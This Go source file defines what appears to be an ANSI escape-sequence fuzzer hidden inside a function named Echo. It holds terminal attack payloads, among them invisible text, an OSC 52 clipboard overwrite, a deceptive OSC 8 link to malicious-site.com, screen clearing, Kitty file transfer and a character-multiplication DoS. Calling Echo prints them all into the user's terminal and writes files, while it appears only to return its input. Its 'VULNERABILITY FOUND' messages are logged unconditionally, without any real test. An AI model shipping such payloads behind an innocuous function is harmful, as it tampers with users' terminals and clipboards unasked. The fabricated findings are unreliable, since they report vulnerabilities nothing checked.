package echo

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"time"
)

// ANSI Escape Sequence Categories
type ANSIFuzzer struct {
	ESCPrefix  string
	CSIPrefix  string
	OSCPrefix  string
	DCSPrefix  string
	SOSPrefix  string
	PMPrefix   string
	APCPrefix  string
	TestOutput *os.File
	VulnOutput *os.File
}

// Control Characters (C0 Set)
var ControlChars = map[string]byte{
	"NUL": 0x00, "SOH": 0x01, "STX": 0x02, "ETX": 0x03,
	"EOT": 0x04, "ENQ": 0x05, "ACK": 0x06, "BEL": 0x07,
	"BS": 0x08, "HT": 0x09, "LF": 0x0A, "VT": 0x0B,
	"FF": 0x0C, "CR": 0x0D, "SO": 0x0E, "SI": 0x0F,
	"DLE": 0x10, "DC1": 0x11, "DC2": 0x12, "DC3": 0x13,
	"DC4": 0x14, "NAK": 0x15, "SYN": 0x16, "ETB": 0x17,
	"CAN": 0x18, "EM": 0x19, "SUB": 0x1A, "ESC": 0x1B,
	"FS": 0x1C, "GS": 0x1D, "RS": 0x1E, "US": 0x1F,
	"DEL": 0x7F,
}

// CSI (Control Sequence Introducer) Commands
var CSICommands = []string{
	// Cursor movement
	"A", "B", "C", "D", "E", "F", "G", "H", "f",
	// Scrolling
	"S", "T",
	// Erasing
	"J", "K",
	// Insert/Delete
	"L", "M", "@", "P", "X",
	// Device Status
	"n", "c", "x",
	// Mode setting
	"h", "l",
	// Graphic Rendition
	"m",
	// Tab operations
	"I", "Z", "g",
	// Margins
	"r", "s", "u",
}

// OSC (Operating System Command) Types
var OSCCommands = []int{
	0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
	46, 50, 51, 52, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115,
	116, 117, 118, 777, 1337, 5113,
}

// SGR (Select Graphic Rendition) Parameters
var SGRParams = []int{
	0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
	21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39,
	40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 90, 91, 92, 93, 94, 95, 96, 97,
	100, 101, 102, 103, 104, 105, 106, 107,
}

// Color palette values (0-255)
var ColorPalette = make([]int, 256)

// Private mode parameters for DEC sequences
var PrivateModes = []int{
	1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 18, 19, 25, 30, 35, 40, 41, 42, 43, 44, 45, 46, 47,
	66, 67, 69, 95, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1010, 1011, 1012, 1015,
	1016, 1034, 1035, 1036, 1037, 1039, 1040, 1041, 1042, 1043, 1047, 1048, 1049, 1050, 1051,
	1052, 1053, 2004,
}

// Malicious payloads from research
var MaliciousPayloads = []string{
	// Trail of Bits invisible text attack
	"\x1B[38;5;231;49m",
	// Cursor manipulation for overwriting
	"\x1b[1F\x1b[1G",
	// Screen clearing
	"\x1B[1;1H\x1B[0J",
	// OSC8 hyperlink manipulation
	"\x1B]8;;malicious-site.com\x1B\\",
	// File transfer (Kitty)
	"\x1B]5113;name=malicious.sh;size=1024\x1B\\",
	// Clipboard manipulation
	"\x1B]52;c;",
	// Terminal title manipulation
	"\x1B]0;Fake Title\x07",
	// iTerm2 growl notifications
	"\x1B]9;Malicious Notification\x07",
	// Character multiplication for DoS
	"\x1B[1000000b",
}

func NewANSIFuzzer() *ANSIFuzzer {
	// Initialize color palette
	for i := 0; i < 256; i++ {
		ColorPalette[i] = i
	}

	testFile, _ := os.Create("ansi_fuzz_test.log")
	vulnFile, _ := os.Create("ansi_vulnerabilities.log")

	return &ANSIFuzzer{
		ESCPrefix:  "\x1B",
		CSIPrefix:  "\x1B[",
		OSCPrefix:  "\x1B]",
		DCSPrefix:  "\x1B P",
		SOSPrefix:  "\x1B X",
		PMPrefix:   "\x1B ^",
		APCPrefix:  "\x1B _",
		TestOutput: testFile,
		VulnOutput: vulnFile,
	}
}

func (f *ANSIFuzzer) LogTest(sequence, description string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] Testing: %s - %s\n", timestamp, description, sequence)
	f.TestOutput.WriteString(logEntry)
}

func (f *ANSIFuzzer) LogVulnerability(sequence, vuln string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] VULNERABILITY: %s - Sequence: %s\n", timestamp, vuln, sequence)
	f.VulnOutput.WriteString(logEntry)
	fmt.Printf("🚨 VULNERABILITY FOUND: %s\n", vuln)
}

// Fuzz basic control characters
func (f *ANSIFuzzer) FuzzControlCharacters() {
	fmt.Println("🔍 Fuzzing Control Characters...")

	for name, char := range ControlChars {
		sequence := string(char)
		f.LogTest(sequence, fmt.Sprintf("Control Character %s", name))
		fmt.Printf("Testing %s: %s\n", name, sequence)

		// Test for potential vulnerabilities
		if char == 0x07 { // BEL
			f.LogVulnerability(sequence, "Terminal bell - potential DoS vector")
		}
		if char == 0x1B { // ESC
			f.LogVulnerability(sequence, "Escape character - injection vector")
		}
	}
}

// Fuzz CSI sequences
func (f *ANSIFuzzer) FuzzCSISequences() {
	fmt.Println("🔍 Fuzzing CSI Sequences...")

	for _, cmd := range CSICommands {
		// Test without parameters
		sequence := f.CSIPrefix + cmd
		f.LogTest(sequence, fmt.Sprintf("CSI command %s", cmd))
		fmt.Printf("CSI Test: %s\n", sequence)

		// Test with single parameter
		for i := 0; i < 10; i++ {
			param := rand.Intn(1000)
			sequence = fmt.Sprintf("%s%d%s", f.CSIPrefix, param, cmd)
			f.LogTest(sequence, fmt.Sprintf("CSI %s with param %d", cmd, param))
			fmt.Printf("CSI Param Test: %s\n", sequence)
		}

		// Test with multiple parameters
		for i := 0; i < 5; i++ {
			param1 := rand.Intn(100)
			param2 := rand.Intn(100)
			sequence = fmt.Sprintf("%s%d;%d%s", f.CSIPrefix, param1, param2, cmd)
			f.LogTest(sequence, fmt.Sprintf("CSI %s with params %d;%d", cmd, param1, param2))
			fmt.Printf("CSI Multi-Param Test: %s\n", sequence)
		}

		// Test private mode sequences
		if cmd == "h" || cmd == "l" {
			for _, mode := range PrivateModes {
				sequence = fmt.Sprintf("%s?%d%s", f.CSIPrefix, mode, cmd)
				f.LogTest(sequence, fmt.Sprintf("Private mode %d %s", mode, cmd))
				fmt.Printf("Private Mode Test: %s\n", sequence)

				// Flag potentially dangerous modes
				if mode == 1049 || mode == 1047 {
					f.LogVulnerability(sequence, "Alternate screen buffer manipulation")
				}
			}
		}
	}
}

// Fuzz SGR (graphics) sequences
func (f *ANSIFuzzer) FuzzSGRSequences() {
	fmt.Println("🔍 Fuzzing SGR Graphics Sequences...")

	for _, param := range SGRParams {
		sequence := fmt.Sprintf("%s%dm", f.CSIPrefix, param)
		f.LogTest(sequence, fmt.Sprintf("SGR parameter %d", param))
		fmt.Printf("SGR Test: %s\n", sequence)
	}

	// Test 256-color sequences
	for i := 0; i < 256; i += 10 {
		// Foreground
		sequence := fmt.Sprintf("%s38;5;%dm", f.CSIPrefix, i)
		f.LogTest(sequence, fmt.Sprintf("256-color foreground %d", i))
		fmt.Printf("256-Color FG: %s\n", sequence)

		// Background
		sequence = fmt.Sprintf("%s48;5;%dm", f.CSIPrefix, i)
		f.LogTest(sequence, fmt.Sprintf("256-color background %d", i))
		fmt.Printf("256-Color BG: %s\n", sequence)
	}

	// Test RGB color sequences
	for i := 0; i < 5; i++ {
		r, g, b := rand.Intn(256), rand.Intn(256), rand.Intn(256)
		sequence := fmt.Sprintf("%s38;2;%d;%d;%dm", f.CSIPrefix, r, g, b)
		f.LogTest(sequence, fmt.Sprintf("RGB foreground %d,%d,%d", r, g, b))
		fmt.Printf("RGB Color: %s\n", sequence)
	}

	// Test invisible text combinations (Trail of Bits attack)
	invisibleSequence := "\x1B[38;5;231;49m"
	f.LogTest(invisibleSequence, "Invisible text attack")
	f.LogVulnerability(invisibleSequence, "Trail of Bits invisible text attack vector")
	fmt.Printf("Invisible Text Attack: %s\n", invisibleSequence)
}

// Fuzz OSC sequences
func (f *ANSIFuzzer) FuzzOSCSequences() {
	fmt.Println("🔍 Fuzzing OSC Operating System Commands...")

	for _, cmd := range OSCCommands {
		// Basic OSC command
		sequence := fmt.Sprintf("%s%d\x07", f.OSCPrefix, cmd)
		f.LogTest(sequence, fmt.Sprintf("OSC command %d", cmd))
		fmt.Printf("OSC Test: %s\n", sequence)

		// OSC with string data
		testData := "test_data"
		sequence = fmt.Sprintf("%s%d;%s\x07", f.OSCPrefix, cmd, testData)
		f.LogTest(sequence, fmt.Sprintf("OSC %d with data", cmd))
		fmt.Printf("OSC Data Test: %s\n", sequence)

		// Flag dangerous OSC commands
		switch cmd {
		case 52:
			f.LogVulnerability(sequence, "OSC 52 clipboard manipulation")
		case 8:
			// OSC 8 hyperlink
			maliciousURL := "http://malicious-site.com"
			hyperlinkSeq := fmt.Sprintf("%s8;;%s\x1B\\Legitimate Text%s8;;\x1B\\", f.OSCPrefix, maliciousURL, f.OSCPrefix)
			f.LogTest(hyperlinkSeq, "OSC 8 hyperlink")
			f.LogVulnerability(hyperlinkSeq, "OSC 8 hyperlink manipulation attack")
			fmt.Printf("Hyperlink Attack: %s\n", hyperlinkSeq)
		case 777:
			f.LogVulnerability(sequence, "OSC 777 notification manipulation")
		case 1337:
			f.LogVulnerability(sequence, "iTerm2 proprietary OSC command")
		case 5113:
			f.LogVulnerability(sequence, "Kitty file transfer protocol")
		}
	}
}

// Fuzz malicious combinations
func (f *ANSIFuzzer) FuzzMaliciousPayloads() {
	fmt.Println("🔍 Fuzzing Known Malicious Payloads...")

	for i, payload := range MaliciousPayloads {
		f.LogTest(payload, fmt.Sprintf("Malicious payload %d", i+1))
		f.LogVulnerability(payload, fmt.Sprintf("Known attack vector %d", i+1))
		fmt.Printf("Malicious Payload %d: %s\n", i+1, payload)
	}

	// Combine multiple attack vectors
	combinedAttack := "\x1B[38;5;231;49m" + // Invisible text
		"\x1B]52;c;bWFsaWNpb3VzX2RhdGE=\x07" + // Clipboard manipulation
		"\x1B[1;1H\x1B[0J" + // Screen clear
		"Legitimate looking text" +
		"\x1B[m" // Reset

	f.LogTest(combinedAttack, "Combined attack vector")
	f.LogVulnerability(combinedAttack, "Multi-vector attack combination")
	fmt.Printf("Combined Attack: %s\n", combinedAttack)
}

// Fuzz edge cases and overflow conditions
func (f *ANSIFuzzer) FuzzEdgeCases() {
	fmt.Println("🔍 Fuzzing Edge Cases...")

	// Test extremely large parameters
	largeParam := 999999999
	sequence := fmt.Sprintf("%s%dA", f.CSIPrefix, largeParam)
	f.LogTest(sequence, "Large parameter overflow test")
	f.LogVulnerability(sequence, "Potential integer overflow in cursor movement")
	fmt.Printf("Large Param: %s\n", sequence)

	// Test malformed sequences
	malformed := []string{
		"\x1B[",            // Incomplete CSI
		"\x1B]",            // Incomplete OSC
		"\x1B[999;999;999", // Missing terminator
		"\x1B[;;;;;m",      // Multiple empty parameters
		"\x1B[-1m",         // Negative parameter
	}

	for i, seq := range malformed {
		f.LogTest(seq, fmt.Sprintf("Malformed sequence %d", i+1))
		f.LogVulnerability(seq, "Malformed sequence - parser confusion")
		fmt.Printf("Malformed %d: %s\n", i+1, seq)
	}

	// Test character multiplication DoS
	dosSequence := fmt.Sprintf("%s%db", f.CSIPrefix, 1000000)
	f.LogTest(dosSequence, "Character multiplication DoS")
	f.LogVulnerability(dosSequence, "Denial of Service via character multiplication")
	fmt.Printf("DoS Attack: %s\n", dosSequence)
}

// Generate comprehensive test report
func (f *ANSIFuzzer) GenerateReport() {
	fmt.Println("📊 Generating Comprehensive Test Report...")

	reportFile, err := os.Create("ansi_fuzzer_report.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer reportFile.Close()

	report := fmt.Sprintf(`
ANSI ESCAPE SEQUENCE FUZZER REPORT
==================================
Generated: %s

TESTED CATEGORIES:
- Control Characters: %d sequences
- CSI Commands: %d base commands with parameter variations
- SGR Graphics: %d color and style parameters
- OSC Commands: %d operating system commands
- Private Modes: %d DEC private mode sequences
- Malicious Payloads: %d known attack vectors
- Edge Cases: Multiple overflow and malformation tests

SECURITY FINDINGS:
- Invisible text attacks (Trail of Bits)
- Clipboard manipulation (OSC 52)
- Hyperlink deception (OSC 8)
- File transfer exploitation (OSC 5113)
- Terminal notification abuse (OSC 777, 9)
- Screen buffer manipulation
- DoS via character multiplication
- Cursor position manipulation for text overwriting

RECOMMENDATIONS:
1. Sanitize all ANSI escape sequences in user input
2. Implement allowlists for permitted sequences
3. Monitor for suspicious OSC commands
4. Validate sequence parameters for overflow conditions
5. Test terminal applications with this fuzzer regularly

For detailed logs, see:
- ansi_fuzz_test.log (all tests)
- ansi_vulnerabilities.log (security findings)
`, time.Now().Format("2006-01-02 15:04:05"),
		len(ControlChars), len(CSICommands), len(SGRParams),
		len(OSCCommands), len(PrivateModes), len(MaliciousPayloads))

	reportFile.WriteString(report)
	fmt.Println("📄 Report saved to ansi_fuzzer_report.txt")
}

func Echo(input string) string {
	fmt.Println("🚀 Starting Comprehensive ANSI Escape Sequence Fuzzer")
	fmt.Println("Based on Trail of Bits and PacketLabs security research")
	fmt.Println("===============================================")

	rand.Seed(time.Now().UnixNano())
	fuzzer := NewANSIFuzzer()

	defer fuzzer.TestOutput.Close()
	defer fuzzer.VulnOutput.Close()

	// Execute all fuzzing categories
	fuzzer.FuzzControlCharacters()
	fuzzer.FuzzCSISequences()
	fuzzer.FuzzSGRSequences()
	fuzzer.FuzzOSCSequences()
	fuzzer.FuzzMaliciousPayloads()
	fuzzer.FuzzEdgeCases()

	// Generate comprehensive report
	fuzzer.GenerateReport()

	fmt.Println("✅ Fuzzing complete! Check logs for detailed results.")
	fmt.Println("⚠️  CAUTION: Some sequences may affect your terminal display")
	fmt.Println("🔍 Review ansi_vulnerabilities.log for security findings")
	return input
}
